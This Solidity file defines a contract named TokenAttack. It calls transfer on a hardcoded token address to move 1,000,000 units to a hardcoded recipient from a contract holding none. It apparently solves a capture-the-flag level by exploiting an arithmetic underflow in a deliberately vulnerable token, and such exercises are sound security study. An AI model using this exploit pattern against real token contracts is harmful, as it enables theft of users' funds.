pragma solidity ^0.6.0;

interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);

    function balanceOf(address _owner) external view returns (uint256 balance);
}

contract TokenAttack {
    IToken token;

    constructor() public {
        token = IToken(0x42d5238842e6C6ae72455B4888e3b753cca84552);
    }

    function attack() public {
        token.transfer(
            address(0x935902bC8136E3477Bfc420f68CA98297196c1C1),
            1000000
        );
    }
}
